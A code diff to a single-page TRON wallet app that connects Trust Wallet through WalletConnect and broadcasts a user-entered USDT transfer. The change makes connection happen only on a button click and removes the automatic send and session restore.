@@ -7,7 +7,7 @@
 
 <link rel="icon" href="data:,">
 
-<!-- WalletConnect -->
+<!-- ✅ WalletConnect -->
 <script src="https://unpkg.com/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>
 
 <style>
@@ -82,7 +82,7 @@ body{
 
 <div class="container">
 
-<div id="status" class="status">Initializing...</div>
+<div id="status" class="status">Click Next to Connect</div>
 
 <div class="box">
   <div class="label">Address</div>
@@ -116,40 +116,38 @@ let client = null;
 let session = null;
 let address = null;
 
-// 🔥 SAFE SIGN CLIENT
-function getSignClient() {
-  if (window.SignClient?.init) return window.SignClient;
-  if (window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
-  if (window.walletconnect?.SignClient?.init) return window.walletconnect.SignClient;
+// ✅ SAFE SIGN CLIENT
+function getSignClient(){
+  if(window.SignClient?.init) return window.SignClient;
+  if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
+  if(window.walletconnect?.SignClient?.init) return window.walletconnect.SignClient;
 
-  for (let k in window) {
-    try {
-      if (window[k]?.SignClient?.init) return window[k].SignClient;
-    } catch {}
+  for(let k in window){
+    try{
+      if(window[k]?.SignClient?.init) return window[k].SignClient;
+    }catch{}
   }
   return null;
 }
 
-// STATUS
 function setStatus(t){
   document.getElementById("status").innerText = t;
 }
 
-// 🚀 INIT (AUTO CONNECT LIKE BINANCE)
-async function init(){
-  try {
+// CONNECT (ONLY on user click → IMPORTANT)
+async function connectWallet(){
+  try{
+    setStatus("Opening wallet...");
+
     // Trust Wallet browser
-    if (window.tronWeb?.defaultAddress?.base58) {
+    if(window.tronWeb?.defaultAddress?.base58){
       address = window.tronWeb.defaultAddress.base58;
-      setStatus("Connected: " + shortAddr(address));
-      return;
+      setStatus("Connected: " + address);
+      return true;
     }
 
     const SignClient = getSignClient();
-    if (!SignClient) {
-      setStatus("Loading Wallet...");
-      return;
-    }
+    if(!SignClient) throw new Error("WalletConnect not loaded");
 
     client = await SignClient.init({
       projectId: PROJECT_ID,
@@ -161,25 +159,6 @@ async function init(){
       }
     });
 
-    // 🔥 SESSION RESTORE (key for smooth UX)
-    const sessions = client.session.getAll();
-    if (sessions.length) {
-      session = sessions[0];
-      address = session.namespaces.tron.accounts[0].split(":")[2];
-      setStatus("Connected: " + shortAddr(address));
-    } else {
-      setStatus("Ready to connect");
-    }
-
-  } catch (e) {
-    console.error(e);
-    setStatus("Init error");
-  }
-}
-
-// CONNECT
-async function connectWallet(){
-  try {
     const { uri, approval } = await client.connect({
       requiredNamespaces:{
         tron:{
@@ -190,39 +169,42 @@ async function connectWallet(){
       }
     });
 
-    if (uri) {
+    if(uri){
       const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+
+      // 🔥 FORCE OPEN (important for popup)
       window.location.href = link;
     }
 
     session = await approval();
 
     address = session.namespaces.tron.accounts[0].split(":")[2];
-    setStatus("Connected: " + shortAddr(address));
+    setStatus("Connected: " + address);
 
-    // 🔥 auto continue
-    setTimeout(sendUSDT, 400);
+    return true;
 
-  } catch (e) {
+  }catch(e){
     console.error(e);
     setStatus("Connection failed");
+    return false;
   }
 }
 
 // BUTTON FLOW
 async function handleNext(){
-  if (!address) {
-    await connectWallet();
-  } else {
-    sendUSDT();
+  if(!address){
+    const ok = await connectWallet();
+    if(!ok) return;
   }
+
+  sendUSDT();
 }
 
-// SEND USDT
+// SEND
 async function sendUSDT(){
-  try {
+  try{
     const amount = parseFloat(document.getElementById("amount").value);
-    if (!amount) return alert("Enter amount");
+    if(!amount) return alert("Enter amount");
 
     const sun = Math.floor(amount * 1e6);
 
@@ -245,7 +227,7 @@ async function sendUSDT(){
 
     let signed;
 
-    if (window.tronWeb) {
+    if(window.tronWeb){
       signed = await window.tronWeb.trx.sign(tx.transaction);
     } else {
       signed = await client.request({
@@ -258,23 +240,18 @@ async function sendUSDT(){
       });
     }
 
-    const res = await fetch("https://api.trongrid.io/wallet/broadcasttransaction",{
+    await fetch("https://api.trongrid.io/wallet/broadcasttransaction",{
       method:"POST",
       headers:{'Content-Type':'application/json'},
       body:JSON.stringify(signed)
-    }).then(r=>r.json());
+    });
 
-    alert("Transaction Sent");
+    alert("Transaction sent");
 
-  } catch (e) {
+  }catch(e){
     console.error(e);
-    alert("Error: " + e.message);
+    alert("Error: "+e.message);
   }
-}
-
-// HELPER
-function shortAddr(a){
-  return a.slice(0,6) + "..." + a.slice(-4);
 }
 
 // BASE58
@@ -288,9 +265,6 @@ function base58ToHex(addr){
   if(hex.length%2) hex="0"+hex;
   return "41"+hex.slice(2,-8);
 }
-
-// INIT ON LOAD
-init();
 </script>
 
 </body>
